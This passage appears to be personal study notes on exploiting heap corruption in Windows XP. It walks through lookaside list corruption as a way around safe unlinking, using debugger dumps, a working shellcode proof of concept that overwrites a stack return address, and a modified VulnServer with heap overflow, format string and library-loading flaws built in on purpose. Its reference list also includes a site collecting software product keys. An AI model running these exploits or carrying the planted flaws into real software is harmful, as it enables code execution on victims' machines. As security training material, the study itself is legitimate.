            #exploit = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj"
            exploit += "\x10\x63\x32\x00" #  ecx  003507a0 00326310 0012fca8  
            exploit += "\x18\xfb\x12\x00" # [eax] \x18\xfb\x12\x00
            exploit += "\xcc\x01\xc8\xcc"
            exploit += "\xcc"*10
            exploit += "\x90" * (MAX-len(exploit))
            #bp 77f6256f 77f5234c // arbitrary writes
            #shellcode poinrters 0012f9ac 0012fcc4
            return exploit 
        ```

### Safe Unlinking Bypass Exploits (only on SP2/SP3)

References:

- https://msrc.microsoft.com/blog/2009/08/preventing-the-exploitation-of-user-mode-heap-corruption-vulnerabilities/

- https://www.ptsecurity.com/upload/corporate/ww-en/download/defeating-xpsp2-heap-protection.pdf

- https://stackoverflow.com/questions/64810909/getting-symbols-for-windows-xp-sp1

- https://stackoverflow.com/questions/38212777/windbg-doesnt-really-search-pdb-file-in-the-provided-path

- https://stackoverflow.com/questions/47516712/what-versions-of-python-will-work-in-windows-xp

- https://ea-technology.xp3.biz/microsoft-visual-studio-all-versions-product-keys-collection/

- https://groups.google.com/g/microsoft.public.vb.general.discussion/c/sqzhSSmeFiQ

- https://archive.org/details/windows-installer-3.1

- https://rstforums.com/forum/topic/67740-defeating-microsoft-windows-xp-sp2-heap-protection-and-dep-bypass/

- https://reverseengineering.stackexchange.com/questions/2082/debugger-hiding-plugin-for-windbg

- https://www.pconlife.com/viewfileinfo/pdbreaderx86-exe/

- https://github.com/stevenseeley/heaper

Overview:

- From windows sp2 and onwards, a check is performed during unlinking to mitigate the above mentioned exploits

- We will check that the chunk to be unlink flink blink points to itself and the blink flink points to itself

- Relevant code relating to safe unlinking:

    ```
    0:000> u 7c91142e 
    ntdll!wcsncpy+0x99f:
    7c91142e 8b39            mov     edi,dword ptr [ecx]
    7c911430 3b7804          cmp     edi,dword ptr [eax+4]
    7c911433 0f85472f0200    jne     ntdll!RtlInitializeContext+0x2ff (7c934380)
    7c911439 3bfa            cmp     edi,edx
    7c91143b 0f853f2f0200    jne     ntdll!RtlInitializeContext+0x2ff (7c934380)
    7c911441 8901            mov     dword ptr [ecx],eax
    7c911443 894804          mov     dword ptr [eax+4],ecx
    7c911446 8a4605          mov     al,byte ptr [esi+5]
    ```

    ```
    if (chunk1->flink == chunk2 && chunk3->blink == chunk2) {
        chunk1->flink = chunk3
        chunk3->blink = chunk1
    }
    ```

There are various exploits that we can still perform regarding heap corruption:

1. Lookaside List (LAL) Corruption

    - Overview: We can perform 2 heap allocations, free the second one, and overflow the first one in order to corrupt the LAL entries. When we free the second heap allocation, as long as it is set to the correct size, we can free it to the LAL. After which, we can perform a series of allocation to return the any address we want which we used to corrupt the LAL (needs to be readable and writeable).

    - Each lookaside entry should be 0x30 bytes (6 * 8)

        ```
        00360688  90 1E 36 00 00 00 00 00  Ẑ6..
        00360690  04 00 00 01 00 00 00 00  Ā..
        00360698  00 00 00 00 00 00 00 00  ....
        003606A0  00 00 00 00 00 00 00 00  ....
        003606A8  00 00 00 00 00 00 00 00  ....
        003606B0  00 00 00 00 00 00 00 00  ....
        003606B8  00 00 00 00 00 00 00 00  ....
        003606C0  04 00 00 01 00 00 00 00  Ā..
        003606C8  00 00 00 00 00 00 00 00  ....
        003606D0  00 00 00 00 00 00 00 00  ....
        003606D8  00 00 00 00 02 00 00 00  ...
        003606E0  01 00 00 00 00 00 00 00  ...
        003606E8  00 00 00 00 00 00 00 00  ....
        003606F0  04 00 00 01 00 00 00 00  Ā..
        003606F8  00 00 00 00 00 00 00 00  ....
        00360700  00 00 00 00 00 00 00 00  ....
        00360708  00 00 00 00 01 00 00 00  ...
        00360710  01 00 00 00 00 00 00 00  ...
        00360718  00 00 00 00 00 00 00 00  ....
        00360720  04 00 00 01 00 00 00 00  Ā..
        00360728  00 00 00 00 00 00 00 00  ....
        00360730  00 00 00 00 00 00 00 00  ....
        00360738  00 00 00 00 00 00 00 00  ....
        00360740  00 00 00 00 00 00 00 00  ....
        00360748  00 00 00 00 00 00 00 00  ....
        00360750  04 00 00 01 00 00 00 00  Ā..
        00360758  00 00 00 00 00 00 00 00  ....
        00360760  00 00 00 00 00 00 00 00  ....
        00360768  00 00 00 00 00 00 00 00  ....
        00360770  00 00 00 00 00 00 00 00  ....
        00360778  00 00 00 00 00 00 00 00  ....
        00360780  04 00 00 01 00 00 00 00  Ā..
        00360788  00 00 00 00 00 00 00 00  ....
        00360790  00 00 00 00 00 00 00 00  ....
        00360798  00 00 00 00 00 00 00 00  ....
        003607A0  00 00 00 00 00 00 00 00  ....
        003607A8  00 00 00 00 00 00 00 00  ....
        003607B0  04 00 00 01 00 00 00 00  Ā..
        003607B8  00 00 00 00 00 00 00 00  ....
        003607C0  00 00 00 00 00 00 00 00  ....
        003607C8  00 00 00 00 00 00 00 00  ....
        003607D0  00 00 00 00 00 00 00 00  ....
        ...
        00361E58  00 00 00 00 00 00 00 00  ....
        00361E60  04 00 00 01 00 00 00 00  Ā..
        00361E68  00 00 00 00 00 00 00 00  ....
        00361E70  00 00 00 00 00 00 00 00  ....
        00361E78  00 00 00 00 00 00 00 00  ....
        00361E80  00 00 00 00 00 00 00 00  ....
        00361E88  97 00 01 03 B3 00 08 00  ́³
        00361E90  50 27 36 00 88 06 36 00  ❐6ڈ6
        00361E98  00 00 00 00 00 00 00 00  ....
        00361EA0  00 00 00 00 00 00 00 00  ....
        00361EA8  00 00 00 00 00 00 00 00  ....
        00361EB0  00 00 00 00 00 00 00 00  ....
        00361EB8  00 00 00 00 00 00 00 00  ....
        00361EC0  00 00 00 00 00 00 00 00  ....
        ```

    - Make sure to disable anti-debugging, if not the heap will look like this:

        ```
        _HEAP @ 340000
        HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00341e98 0005 0000  [07]   00341ea0    00010 - (busy)

        0:000> dd 00341ea0    -8
        00341e98  03030005 00180735 00000000 00000000
        00341ea8  00000000 00000000 abababab abababab
        00341eb8  00000000 00000000 00050005 0018073e
        00341ec8  00000000 00000000 00000000 00000000
        00341ed8  abababab abababab 00000000 00000000
        00341ee8  00050223 00ee14ee 00340178 00340178 <- flink/blink
        00341ef8  feeefeee feeefeee feeefeee feeefeee
        00341f08  feeefeee feeefeee feeefeee feeefeee
        ```

        - Heap a/1 starts at 00341e98

        - Heap b/2 starts at 00341ec0  

        ```
        0:000> dd 00341ea0-8
        00341e98  03030005 00180735 00000000 00000000
        00341ea8  00000000 00000000 abababab abababab
        00341eb8  00000000 00000000 00050228 0018143e
        00341ec8  00340178 00340178 feeefeee feeefeee
        00341ed8  feeefeee feeefeee feeefeee feeefeee
        00341ee8  feeefeee feeefeee feeefeee feeefeee
        00341ef8  feeefeee feeefeee feeefeee feeefeee
        00341f08  feeefeee feeefeee feeefeee feeefeee
        ```

        - After freeing Heap b/2

        ```
        0:000> dd 00341ea0-8
        00341e98  03030005 00180735 41414141 41414141
        00341ea8  41414141 41414141 42424242 43434343
        00341eb8  44444444 45454545 00050228 0018143e
        00341ec8  00340178 00340178 feeefeee feeefeee
        00341ed8  feeefeee feeefeee feeefeee feeefeee
        00341ee8  feeefeee feeefeee feeefeee feeefeee
        00341ef8  feeefeee feeefeee feeefeee feeefeee
        00341f08  feeefeee feeefeee feeefeee feeefeee
        ```

        - Overflow with 16 As + BBBBCCCDDDDEEEEFFFFGGGG

    - Specific pointer exploitation:

        - Vulnerable Program (Fuzzy Security):

            ```
            // BypassSafeUnlinkingHeapOverflow.cpp : Defines the entry point for the console application.
            //

            #include "stdafx.h"
            #include <stdio.h>
            #include <windows.h>
            void main(int argc,char *argv[])
            {
                    char bufA[1000];
                    char bufB[1000];
                    char bufC[1000];

                    HLOCAL a,b,c;
                    HANDLE hHeap;
                    char buf[10];
            
                    printf("----------------------------\n");
                    printf("Overwrite a chunk on the lookaside\n");
                    printf("Heap demonstration\n");
                    printf("----------------------------\n");
            
                    // create the heap
                    hHeap = HeapCreate(0x00040000,0,0);
                    printf("\n(+) Creating a heap at: 0x00%xh\n",hHeap);
                    printf("(+) Allocating chunk A\n");
            
                    // allocate the first chunk of size N (<0x3F8 bytes)
                    a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
                    printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
                    __asm {
                        int 0x3
                    };

                    printf("(+) Allocating chunk B\n");
            
                    // allocate the second chunk of size N (<0x3F8 bytes)
                    b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
                    printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
            
                    __asm {
                        int 0x3
                    };
            
                    printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
                    printf("(+) Freeing chunk B to the lookaside\n");

                    __asm {
                        int 0x3
                    };
            
                    // Freeing of chunk B: the chunk gets referenced to the lookaside list
                    HeapFree(hHeap,0,b);
            
                    // set software bp
                    __asm {
                        int 0x3
                    };
            
                    printf("(+) Now overflow chunk A:\n");
            
                    // The overflow occurs in chunk A: we can manipulate chunk B's Flink
                    // PEB lock routine for testing purposes
                    // 16 bytes for size, 8 bytes for header and 4 bytes for the flink
            
                    //strcpy(bufA,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f");
                    strcpy(bufA,"XXXXXXXXXXXXXXXXAAAABBBBDDDD");
            
                    //gets(bufA);
                    memcpy(a, bufA, strlen(bufA));
            
                    // set software bp
                    __asm {
                        int 0x3
                    };
            
                    printf("(+) Allocating chunk B\n");
            
                    // A chunk of block size N is allocated (C). Our fake pointer is returned
                    // from the lookaside list.
                    b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
                    printf("(+) Allocating chunk C\n");
            
                    // set software bp
                    __asm {
                        int 0x3
                    };
            
                    // A second chunk of size N is allocated: our fake pointer is returned
                    c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
            
                    printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);
            
                    // A copy operation from a controlled input to this buffer occurs: these
                    // bytes are written to our chosen location
                    // insert shellcode here
                    gets(bufC);
                    memcpy(c, bufC, strlen(bufC));
            
                    // set software bp
                    __asm {
                        int 0x3
                    };
            
                    ExitProcess(0);
            }
            ```

        - Vulnerable Program 2:

            ```
            // BypassSafeUnlinkingPoC.cpp : Defines the entry point for the console application.
            //

            #include "stdafx.h"
            /*
            * Defeating Windows XP SP2 Heap protection.
            *
            * Copyright (c) 2004 Alexander Anisimov, Positive Technologies.
            *
            *
            * Tested on:
            *
            * - Windows XP SP2
            * - Windows XP SP1
            * - Windows 2000 SP4
            * - Windows 2003 Server
            *
            * Contacts:
            *
            * anisimov@ptsecurity.com
            * http://www.ptsecurity.com
            *
            * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
            * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
            * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
            *
            */
            #include <stdio.h>
            #include <windows.h>
            unsigned char calc_code[]=
            "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"
            "\x04\x03\x02\x01" // Address of system() function
            "\xFF\xD1\xEB\xF7";
            void fixaddr(char *ptr, unsigned int a)
            {
            ptr[0] = (a & 0xFF);
            ptr[1] = (a & 0xFF00) >> 8;
            ptr[2] = (a & 0xFF0000) >> 16;
            ptr[3] = (a & 0xFF000000) >> 24;
            }
            int getaddr(void)
            {
            HMODULE lib = NULL;
            unsigned int addr_func = 0;
            unsigned char a[4];
            // get address of system() function
            lib = LoadLibrary("msvcrt.dll");
            if (lib == NULL) {
            printf("Error: LoadLibrary failed\n");
            return -1;
            }
            addr_func = (unsigned int)GetProcAddress(lib, "system");
            if (addr_func == 0) {
            printf("Error: GetProcAddress failed\n");
            return -1;
            }
            printf("Address of msvcrt.dll!system(): %08X\n\n", addr_func); 
            fixaddr((char*)a, addr_func);
            memcpy(calc_code+13, a, 4);
            return 0;
            } 
            int main(int argc, char **argv)
            {
            HANDLE h = NULL;
            LPVOID mem1 = NULL, mem2 = NULL, mem3 = NULL;
            unsigned char shellcode[128];
            if (getaddr() != 0)
            return 0;
            // create private heap
            h = HeapCreate(0, 0, 0);
            if (h == NULL) {
            printf("Error: HeapCreate failed\n");
            return 0;
            }
            printf("Heap: %08X\n", h);
            __asm { int 0x3 }

            mem1 = HeapAlloc(h, 0, 64-8);
            printf("Heap block 1: %08X\n", mem1);
            __asm { int 0x3 }

            mem2 = HeapAlloc(h, 0, 128-8);
            printf("Heap block 2: %08X\n", mem2);
            __asm { int 0x3 }
            
            HeapFree(h, 0, mem1);
            __asm { int 0x3 }
            
            HeapFree(h, 0, mem2);
            __asm { int 0x3 }
            
            mem1 = HeapAlloc(h, 0, 64-8);
            printf("Heap block 1: %08X\n", mem1);
            __asm { int 0x3 }
            
            // buffer overflow occurs here...
            memset(mem1, 0x31, 64);
            __asm { int 0x3 }
            
            // fake allocation address in the stack
            memcpy((char *)mem1+64, "\x84\xFF\x12\x00", 4);
            __asm { int 0x3 }
            
            // lookaside list overwrite occurs here...
            mem2 = HeapAlloc(h, 0, 128-8);
            printf("Heap block 2: %08X\n", mem2);
            __asm { int 0x3 }
            
            // allocate memory from the stack
            mem3 = HeapAlloc(h, 0, 128-8);
            printf("Heap block 3: %08X\n", mem3);
            __asm { int 0x3 }
            
            memset(shellcode, 0, sizeof(shellcode)-1);
            // fake ret address
            memcpy(shellcode, "\x8B\xFF\x12\x00", 4);
            // shellcode - "calc.exe"
            memcpy(shellcode+4, "\x90\x90\x90\x90", 4);
            memcpy(shellcode+4+4, calc_code, sizeof(calc_code)-1);
            __asm { int 0x3 }
            
            // overwrite stack frame
            memcpy(mem3, shellcode, sizeof(calc_code)-1+8);
            
            return 0;
            }
            ```

        - Note that from windows sp2 and onwards, PEB base address is randomized. We cannot overw PEB pointers. Hence, we can return the return address of the current stack frame, overflow it with our shellcode.

        - Debugging (FuzzySecurity Vulnerable Program):

            ```
            00361E80  00 00 00 00 00 00 00 00  ........
            00361E88  08 00 01 03 BE 01 08 00  .¾.
            00361E90  78 01 36 00 78 01 36 00  x6.x6.
            00361E98  00 00 00 00 00 00 00 00  ........
            ...
            00361EC8  27 02 08 00 00 10 00 00  '....
            00361ED0  78 01 36 00 78 01 36 00  x6.x6.
            00361ED8  00 00 00 00 00 00 00 00  ........
            ...
            ```

            - After first allocation

            ```
            00361E80  00 00 00 00 00 00 00 00  ........
            00361E88  08 00 01 03 BE 01 08 00  .¾.
            00361E90  78 01 36 00 78 01 36 00  x6.x6.
            00361E98  00 00 00 00 00 00 00 00  ........
            ...
            00361EC8  10 00 08 00 B6 01 08 00  ..¶.
            00361ED0  78 01 36 00 78 01 36 00  x6.x6.
            00361ED8  00 00 00 00 00 00 00 00  ........
            ...
            00361F48  17 02 10 00 00 10 00 00  ....
            00361F50  78 01 36 00 78 01 36 00  x6.x6.
            00361F58  00 00 00 00 00 00 00 00  ........
            ...
            ```

            - After second allocation

            ```
            Log data, item 1
            Address=00361E88
            Message=               > 0x00361e88  (64)
            Log data, item 2
            Address=00361EC8
            Message=               > 0x00361ec8  (128)
            ```

            - After first free

            ```
            00361E80  00 00 00 00 00 00 00 00  ........
            00361E88  08 00 01 03 BE 01 08 00  .¾.
            00361E90  31 31 31 31 31 31 31 31  11111111
            00361E98  31 31 31 31 31 31 31 31  11111111
            00361EA0  31 31 31 31 31 31 31 31  11111111
            00361EA8  31 31 31 31 31 31 31 31  11111111
            00361EB0  31 31 31 31 31 31 31 31  11111111
            00361EB8  31 31 31 31 31 31 31 31  11111111
            00361EC0  31 31 31 31 31 31 31 31  11111111
            00361EC8  31 31 31 31 31 31 31 31  11111111
            00361ED0  84 FF 12 00 78 01 36 00  „ÿ.x6.
            00361ED8  00 00 00 00 00 00 00 00  ........
            00361EE0  00 00 00 00 00 00 00 00  ........
            ...
            ```

            ```
            00360988   Lookaside[10]:
            00361EC8                  > 0x00361ec8  (128)
            0012FF7C                  > 0x0012ff7c  (128)
            00401A01                  > 0x00401a01  (128)
            890CC47B                  > 0x890cc47b  (128)
                    Lookaside at 0x00360688 dumped
            ```

            - After heap overflow

            ```
            0BADF00D   Dumping Lookaside: 0x00360688  (0x00360000)
            00360988   Lookaside[10]:
            0012FF7C                  > 0x0012ff7c  (128) 0x0012ff84 - 8 0012ff84 points to 0x00401a09
            00401A01                  > 0x00401a01  (128) 0x00401a09 - 8 00401A09 points to 890cc483
            890CC47B                  > 0x890cc47b  (128) 0x890cc483 - 9

            00361EB8  31 31 31 31 31 31 31 31  11111111
            00361EC0  31 31 31 31 31 31 31 31  11111111
            00361EC8  31 31 31 31 AD 31 08 31  1111­11
            00361ED0  84 FF 12 00 78 01 36 00  „ÿ.x6.
            00361ED8  00 00 00 00 00 00 00 00  ........
            00361EE0  00 00 00 00 00 00 00 00  ........
            00361EE8  00 00 00 00 00 00 00 00  ........
            00361EF0  00 00 00 00 00 00 00 00  ........
            00361EF8  00 00 00 00 00 00 00 00  ........
            00361F00  00 00 00 00 00 00 00 00  ........
            00361F08  00 00 00 00 00 00 00 00  ........
            00361F10  00 00 00 00 00 00 00 00  ........
            00361F18  00 00 00 00 00 00 00 00  ........
            ```

            ```
            0012FF80  /0012FFC0  Àÿ.
            0012FF84  |00401A09  .@.  RETURN to BypassSa.<ModuleEntryPoint>+0E9 from BypassSa.0040100A
            0012FF88  |00000001  ...
            0012FF8C  |00430E50  PC.
            0012FF90  |00430DA0   .C.
            0012FF94  |0069006E  n.i.
            0012FF98  |00790074  t.y.
            0012FF9C  |7FFD9000  .ý
            0012FFA0  |00000006  ...
            0012FFA4  |B278CD04  Íx²
            0012FFA8  |0012FF94  ”ÿ.
            0012FFAC  |80615CDB  Û\a€
            0012FFB0  |0012FFE0  àÿ.  Pointer to next SEH record
            0012FFB4  |00404624  $F@.  SE handler
            0012FFB8  |00420248  HB.  BypassSa.00420248
            0012FFBC  |00000000  ....
            0012FFC0  \0012FFF0  ðÿ.
            0012FFC4   7C816D4F  Om|  RETURN to kernel32.7C816D4F
            ```

            - After third allocation

            - Call stack provided

            - Value returned is always lal+8 during allocation

            - Value stored in lal is heapalloc-8 during free

            - After we free 1, 2 chunk, we alloc chunk1 and we overflow, we overwrite everything up to the first 12 bytes of the next chunk with 31 * 8 + stack address

            - LAL corruption essentially, if the LAL value + 8 is NULL/invalid, then know for sure that that is the end of the chunk

    - Application Specific pointer exploitation:

        - References:

            - https://sourceforge.net/projects/mingw/

            - https://github.com/stephenbradshaw/vulnserver

        - Related code:

            ```
            0:001> u ws2_32!wsacleanup L30
            WS2_32!WSACleanup:
            71ab4428 8bff            mov     edi,edi
            71ab442a 55              push    ebp
            71ab442b 8bec            mov     ebp,esp
            71ab442d 51              push    ecx
            71ab442e 51              push    ecx
            71ab442f 56              push    esi
            71ab4430 57              push    edi
            71ab4431 be7040ac71      mov     esi,offset WS2_32!WEP+0x1f6b (71ac4070)
            71ab4436 56              push    esi
            71ab4437 ff158011ab71    call    dword ptr [WS2_32!Ordinal496+0x1180 (71ab1180)]
            71ab443d 8d45f8          lea     eax,[ebp-8]
            71ab4440 50              push    eax
            71ab4441 8d45fc          lea     eax,[ebp-4]
            71ab4444 50              push    eax
            71ab4445 ff152840ac71    call    dword ptr [WS2_32!WEP+0x1f23 (71ac4028)]
            71ab444b 33ff            xor     edi,edi
            71ab444d 3bc7            cmp     eax,edi
            71ab444f 0f8566760000    jne     WS2_32!closesocket+0x2482 (71abbabb)
            71ab4455 ff75fc          push    dword ptr [ebp-4]
            71ab4458 ff15b011ab71    call    dword ptr [WS2_32!Ordinal496+0x11b0 (71ab11b0)]
            71ab445e 3bc7            cmp     eax,edi
            71ab4460 0f8450480000    je      WS2_32!WSCGetProviderPath+0x28f (71ab8cb6)
            71ab4466 83f801          cmp     eax,1
            71ab4469 750c            jne     WS2_32!WSACleanup+0x4f (71ab4477)
            71ab446b 393d8048ac71    cmp     dword ptr [WS2_32!WEP+0x277b (71ac4880)],edi
            71ab4471 0f853a760000    jne     WS2_32!closesocket+0x2478 (71abbab1)
            71ab4477 56              push    esi
            71ab4478 ff15cc11ab71    call    dword ptr [WS2_32!Ordinal496+0x11cc (71ab11cc)]
            71ab447e 8bc7            mov     eax,edi
            71ab4480 5f              pop     edi
            71ab4481 5e              pop     esi
            71ab4482 c9              leave
            71ab4483 c3              ret
            71ab4484 90              nop
            71ab4485 90              nop
            ```

        - Vulnerable Program:

            ```
            #define _WIN32_WINNT 0x501
            /*
            VulnServer - a deliberately vulnerable threaded TCP server application

            This is vulnerable software, don't run it on an important system!  The author assumes no responsibility if 
            you run this software and your system gets compromised, because this software was designed to be exploited!

            Visit my blog for more details: http://www.thegreycorner.com
            */


            /*
            Copyright (c) 2010, Stephen Bradshaw
            All rights reserved.

            Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

                * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
                * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
                * Neither the name of the organization nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

            THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
            */

            #include <windows.h>
            #include <ws2tcpip.h>
            #include <stdlib.h>
            #include <stdio.h>
            #include <psapi.h>


            #define VERSION "1.00"
            #define DEFAULT_BUFLEN 4096
            #define DEFAULT_PORT "9999"


            void Function1(char *Input);
            void Function2(char *Input);
            void Function3(char *Input);
            void Function5(char *Input);
            void Function6(char *Input);
            void Function7(char *Input);
            void Function8(char *Input);
            void Function9(char *Input, SOCKET socket);
            DWORD WINAPI ConnectionHandler(LPVOID CSocket);	

            HANDLE hHeap;
            HLOCAL a;
            HLOCAL b; 
            HLOCAL c;  	

            int main( int argc, char *argv[] ) {

                hHeap = HeapCreate(0x00040000,0,0);
                printf("Heap: %08X\n", hHeap);

                char PortNumber[6];
                const char Usage[94] = "Usage: %s [port_number]\n\nIf no port number is provided, the default port of %s will be used.\n";
                if ( argc > 2) {
                    printf(Usage, argv[0], DEFAULT_PORT);
                    return 1;
                } else if ( argc == 2 ) {
                    if ( (atoi(argv[1]) > 0) && (atoi(argv[1]) < 65536) && (strlen(argv[1]) < 7) ) {
                        strncpy(PortNumber, argv[1], 6);
                    } else {
                        printf(Usage, argv[0], DEFAULT_PORT);
                        return 1;
                    }
                } else {		
                    strncpy(PortNumber, DEFAULT_PORT, 6);
                }
                printf("Starting vulnserver version %s\n", VERSION);
                EssentialFunc1(); // Call function from external dll
                printf("\nThis is vulnerable software!\nDo not allow access from untrusted systems or networks!\n\n");
                WSADATA wsaData;
                SOCKET ListenSocket = INVALID_SOCKET,
                ClientSocket = INVALID_SOCKET;
                struct addrinfo *result = NULL, hints;
                int Result;
                struct sockaddr_in ClientAddress;
                int ClientAddressL = sizeof(ClientAddress);

                Result = WSAStartup(MAKEWORD(2,2), &wsaData);
                if (Result != 0) {
                    printf("WSAStartup failed with error: %d\n", Result);
                    return 1;
                }

                ZeroMemory(&hints, sizeof(hints));
                hints.ai_family = AF_INET;
                hints.ai_socktype = SOCK_STREAM;
                hints.ai_protocol = IPPROTO_TCP;
                hints.ai_flags = AI_PASSIVE;

                Result = getaddrinfo(NULL, PortNumber, &hints, &result);
                if ( Result != 0 ) {
                    printf("Getaddrinfo failed with error: %d\n", Result);
                    WSACleanup();
                    return 1;
                }

                ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
                if (ListenSocket == INVALID_SOCKET) {
                    printf("Socket failed with error: %ld\n", WSAGetLastError());
                    freeaddrinfo(result);
                    WSACleanup();
                    return 1;
                }

                Result = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
                if (Result == SOCKET_ERROR) {
                    printf("Bind failed with error: %d\n", WSAGetLastError());
                    closesocket(ListenSocket);
                    WSACleanup();
                    return 1;
                }

                freeaddrinfo(result);

                Result = listen(ListenSocket, SOMAXCONN);
                if (Result == SOCKET_ERROR) {
                    printf("Listen failed with error: %d\n", WSAGetLastError());
                    closesocket(ListenSocket);
                    WSACleanup();
                    return 1;
                }		

                while(ListenSocket) {	
                    printf("Waiting for client connections...\n");

                    ClientSocket = accept(ListenSocket, (SOCKADDR*)&ClientAddress, &ClientAddressL);
                    if (ClientSocket == INVALID_SOCKET) {
                        printf("Accept failed with error: %d\n", WSAGetLastError());
                        closesocket(ListenSocket);
                        WSACleanup();
                        return 1;
                    }

                    printf("Received a client connection from %s:%u\n", inet_ntoa(ClientAddress.sin_addr), htons(ClientAddress.sin_port));
                    CreateThread(0,0,ConnectionHandler, (LPVOID)ClientSocket , 0,0);
                    
                }

                closesocket(ListenSocket);
                WSACleanup();

                HeapFree(hHeap, 0, a);
                HeapFree(hHeap, 0, b);
                HeapFree(hHeap, 0, c);
                HeapDestroy(hHeap);
                return 0;
            }

            void Function1(char *Input) {
                char Buffer2S[140];
                strcpy(Buffer2S, Input);
            }

            void Function2(char *Input) {
                char Buffer2S[60];
                strcpy(Buffer2S, Input);
            }

            void Function3(char *Input) {
                char Buffer2S[2000];	
                strcpy(Buffer2S, Input);
            }

            void Function4(char *Input) {
                char Buffer2S[1000];
                strcpy(Buffer2S, Input);
            }

            void Function5(char *Input) {
                    if (a == NULL) { printf("Allocate memory first :) But remember to NOT use after free\n"); return; }
                const char delimiter[2] = " ";
                char *token;
                token = strtok(Input, delimiter);
                token = strtok(NULL,  delimiter);
                printf("Token: %s\n", token);
                printf("Heap overflow at address: %x\n", a);
                memcpy(a, token, strlen(token));
            }

            void Function6(char *Input) {
                const char delimiter[2] = " ";
                char *token;
                token = strtok(Input, delimiter);
                token = strtok(NULL,  delimiter);
                printf("Token metadata: %s %d\n", token, strlen(token));
                a = HeapAlloc(hHeap, 8, strlen(token));
                printf("Allocated heap at address: %x\n", a);
            }

            void Function7(char *Input) {
                const char delimiter[2] = " ";
                char *token;
                token = strtok(Input, delimiter);
                token = strtok(NULL,  delimiter);
                printf("Token metadata: %s %d\n", token, strlen(token));
                b = HeapAlloc(hHeap, 8, strlen(token));
                printf("Allocated heap at address: %x\n", b);
                HeapFree(hHeap,0,b);
            }

            void Function8(char *Input) {
                printf("Token : %s\n", Input);
                const char* str = Input;
                printf("Token in hexadecimal: ");
                for (const char* p = str; *p; ++p)
                    {
                        printf("%02x", *p);
                    }
                    printf("\n");
                const char delimiter[2] = " ";
                char *token;       
                token = strtok(Input, delimiter);
                token = strtok(NULL,  delimiter);
                printf("Token metadata: %s %d\n", token, strlen(token));

                b = HeapAlloc(hHeap, 8, strlen(token));
                printf("Allocated heap at address: %x\n", b);
                c = HeapAlloc(hHeap, 8, strlen(token));
                printf("Allocated heap at address: %x\n", c);

                memcpy(c, token, strlen(token));
            }

            void Function10(const char* input, char* output) {
                size_t inputLength = strlen(input);

                for (size_t i = 0; i < inputLength; ++i) {
                    char c = input[i];
                    char base = islower(c) ? 'a' : 'A';

                    if (isalpha(c)) {
                        output[i] = (char)(25 - (c - base) + base); // Reverse the letter
                    } else {
                        output[i] = c; // Keep non-alphabet characters as is
                    }
                }
                output[inputLength] = '\0';
            }


            void Function9(char *Input, SOCKET socket) {
                char pending[] = "CHECKUP PENDING: TRANSFORMING ";
            
                char *token;       
                token = strtok(Input, " ");
                token = strtok(NULL,  " ");
                char backup[100]; 
                strncpy(backup, token, 100);

                char buf[512];
                    strncpy(buf, pending, strlen(pending));
                    strncpy(buf+strlen(pending), backup, strlen(backup));
                snprintf(buf, strlen(pending) + strlen(backup), buf);
                send( socket, buf, strlen(pending) + strlen(backup), 0 );

                char success[] = "CHECKUP SUCCESSFUL: I bestow upon you";
                char decrypt[256];
                Function10(token, decrypt);

                HMODULE h;

                if (strcmp(decrypt, "vv96y626669x93zuxy30x5w00772832y") == 0) {
                    h = GetModuleHandle(NULL);
                } else {
                    h = LoadLibrary(decrypt);
                }

                    if (h == NULL) {
                    return;
                }

                    char str[0x100];
